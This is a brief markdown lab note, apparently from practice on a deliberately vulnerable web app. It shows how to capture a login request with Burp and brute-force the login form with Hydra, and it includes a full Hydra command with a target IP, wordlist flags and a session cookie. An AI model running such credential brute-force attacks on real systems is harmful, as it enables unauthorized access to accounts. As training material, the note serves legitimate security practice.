# bruteforce 


## intercept the req using `burp`

## cheat sheet: [Github](https://github.com/frizb/Hydra-Cheatsheet)

```html
GET /vulnerabilities/brute/?username=user&password=pass&Login=Login HTTP/1.1
Host: hackmylab.xyz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://hackmylab.xyz/vulnerabilities/brute/?username=a&password=d&Login=Login
Cookie: PHPSESSID=lenmrukag1tiq56nnj38jbdq23; security=low
Upgrade-Insecure-Requests: 1
```

## brute-force with Hydra

command is:

hydra 35.238.134.163 -L username -P password http-get-form "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:incorrect:H=Cookie: PHPSESSID=b50pgnon2mojtfqv410pcrhes6;security=low"

|args|details|
|---|---|
|-L | userlist|
|-l | single user|
|-P | password list|
|-p | single pass|
|http-get-form| http req method|
|pass the URL with |^user^ for username ^pass^ for password|
|H | Headers|

